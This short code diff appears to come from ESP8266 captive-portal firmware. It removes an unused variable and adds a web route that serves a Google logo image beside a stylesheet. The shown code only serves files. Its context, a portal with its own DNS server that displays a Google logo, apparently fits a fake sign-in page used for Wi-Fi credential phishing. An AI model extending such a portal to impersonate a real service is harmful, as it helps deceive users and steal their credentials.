@@ -14,7 +14,6 @@ IPAddress APIP(172, 0, 0, 1);  // Gateway
 
 int savedData = 0;
 int timer = 5000;
-int i = 0;
 unsigned long bootTime = 0, lastActivity = 0, lastTick = 0, tickCtr = 0;
 DNSServer dnsServer;
 ESP8266WebServer webServer(80);
@@ -161,6 +160,11 @@ void setup() {
   webServer.on("/style.css", []() {
     File file = SPIFFS.open("/style.css", "r");
     webServer.streamFile(file, "text/css");
+    file.close();
+  });
+  webServer.on("/google-logo.png", []() {
+    File file = SPIFFS.open("/google-logo.png", "r");
+    webServer.streamFile(file, "image/png");
     file.close();
   });
 
